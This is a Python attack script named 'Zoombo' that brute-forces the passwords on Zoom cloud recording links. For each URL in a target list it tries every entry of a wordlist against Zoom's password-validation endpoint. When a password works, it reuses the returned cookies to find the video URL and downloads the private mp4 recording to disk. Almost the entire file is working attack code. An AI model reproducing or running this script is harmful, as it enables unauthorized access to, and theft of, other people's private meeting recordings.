import requests
import json
from bs4 import BeautifulSoup
import sys
import argparse
from colorama import Fore


class Zoombo:
    def __init__(self):
        # The headers MUST be valid before we can submit any real requests.
        self.headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'
        }
        self.parser = argparse.ArgumentParser()
        self.parser.add_argument("-m", "--meetings", required=True,
                                 help="A list of recording URLs to crack. e.g.: --meeting-list company-a.txt")

        self.parser.add_argument("-w", "--wordlist", required=True,
                                 help="Any wordlist with passwords. e.g.: --word-list rockyou.txt")
        self.args = self.parser.parse_args()

        # Colors. No leet program is complete without colors to spice things up.
        self.a = Fore.GREEN
        self.b = Fore.WHITE
        self.c = Fore.CYAN
        self.d = Fore.MAGENTA
        self.f = Fore.BLUE
        self.g = Fore.RESET
        self.h = Fore.LIGHTGREEN_EX
        self.r = Fore.MAGENTA

    # We cannot be hackers if we can't print a neat ascii banner, and then colorize it using color-hacker libraries.
    @staticmethod
    def print_banner():
        c = Fore.LIGHTCYAN_EX
        m = Fore.MAGENTA
        r = Fore.RESET

        banner = f"{r} ____  {c}____{r}  {m}____{r}  _      ____  {m}____ \n"
        banner += f"{r}/_   \{c}/  _ \{m}/  _ \{r}/ \__/|/  _ \{m}/  _ \\\n"
        banner += f"{r} /   /{c}| / \\|{m}| / \\|{r}| |\\/||| | //{m}| / \\|\n"
        banner += f"{r}/   /_{c}| \_/|{m}| \_/|{r}| |  ||| |_\\\\{m}| \_/|\n"
        banner += f"{r}\____/{c}\____/{m}\____/{r}\_/  \|\____/{m}\____/\n\n"
        banner += f"{r}Gratuitous {c}h{m}4{c}x{m}0{c}r{r} ascii art for \nlow-risk vuln because {c}l{m}33{c}t{r}\n\n"
        print(banner)

    def colorize_output(self, msg):
        return(msg.replace("[", f"{self.c}[{self.g}").
               replace("]", f"{self.c}]{self.g}").
               replace("--", f"{self.b}--{self.g}").
               replace("***", f"{self.h}**{self.g}").
               replace("++", f"{self.c}++{self.g}").
               replace("/", f"{self.d}/{self.g}").
               replace(":", f"{self.d}:{self.h}").
               replace("@", f"{self.d}@{self.g}").
               replace("!", f"{self.h}!{self.g}").
               replace(",", f"{self.d},{self.g}").
               replace(";", f"{self.d};{self.r}").
               replace("'", f"{self.d}'{self.g}").
               replace("?", f"{self.r}?{self.g}").
               replace("’", f"{self.d}’{self.g}").
               replace("\"", f"{self.d}’{self.g}") + self.g)

    def c_print(self, msg):
        print(self.colorize_output(msg))

    @staticmethod
    def get_video_url_from_source_code(soup):
        for i in str(soup.findChildren("script")[-3]).split(','):
            if "viewMp4Url" in i:
                return i.split("'")[1]
        return None

    @staticmethod
    def get_recording_id_from_url(url):
        return url.split("/")[-1]

    @staticmethod
    def get_org_id_from_url(url):
        return url.split(".")[0].split("//")[1]

    def brute_force(self):
        if self.args.meetings and self.args.wordlist:
            self.print_banner()
            self.c_print("[++] Starting Candyland Terminal Simulator")
            self.c_print("[!] Welcome to Zoombo!")
            with open(self.args.meetings, "r") as meeting_list, open(self.args.wordlist, "r") as password_file:
                passwords = password_file.read().splitlines()
                meeting_urls = meeting_list.read().splitlines()

                for meeting in meeting_urls:
                    for password in passwords:
                        self.check_credentials(meeting, password)
        else:
            self.parser.print_help()
        self.c_print("[--] All done! Did you find what you're looking for?")

    def check_credentials(self, url, password):
        # Need the appropriate request
        data = f"id={self.get_recording_id_from_url(url)}&passwd={password}&action=viewdetailpage"

        # And the correct Content-Type header, found after minimizing request
        form_submit_headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}

        # Step 1: Login
        login_request = requests.post(f"https://{self.get_org_id_from_url(url)}.zoom.us/rec/validate_meet_passwd",
                                      data=data,
                                      headers=form_submit_headers)

        # Step 1: Login - Successful
        if login_request.status_code == 200 and json.loads(login_request.text).get('status'):
            self.c_print(f"[***] Brute Force successful! Correct password is: {password}")
            # We found a valid request. Now we need to get the cookie it gives us.
            recording_name = list(login_request.cookies.get_dict().keys())[-1]
            cookie_value = login_request.cookies.get_dict()[recording_name]
            cookies = {recording_name: cookie_value}

            # This gets the exfiltration URL

            # Step 2 - Get Play URL from Successful Login cookies + URL
            play_request = requests.get(f"https://{self.get_org_id_from_url(url)}.zoom.us/rec/share/{recording_name}",
                                        headers=self.headers,
                                        cookies=cookies,
                                        allow_redirects=True)

            soup = BeautifulSoup(play_request.text, "html.parser")

            # Step 2 - Get Play URL
            video_url = self.get_video_url_from_source_code(soup)

            # Step 3 - Get raw binary mp4 data from Play URL

            if video_url:
                data_request = requests.get(video_url, cookies=play_request.cookies.get_dict(), headers=self.headers)

                if data_request.status_code == 200 and video_url:
                    filename = data_request.url.split('?')[0].split('/')[-1]
                    self.c_print(f"[!] Found file: {filename}")
                    with open(filename, "wb") as file:
                        file.write(data_request.content)
                        self.c_print(f"[!] Saved {filename} to disk")

                else:
                    self.c_print(f"[?] Can't access file")
            else:
                self.c_print(f"[?] Failed to get URL")
        else:
            self.c_print(f"[?] Password failed; {password}")

    def run(self):
        pass


if __name__ == "__main__":
    z = Zoombo()
    z.brute_force()
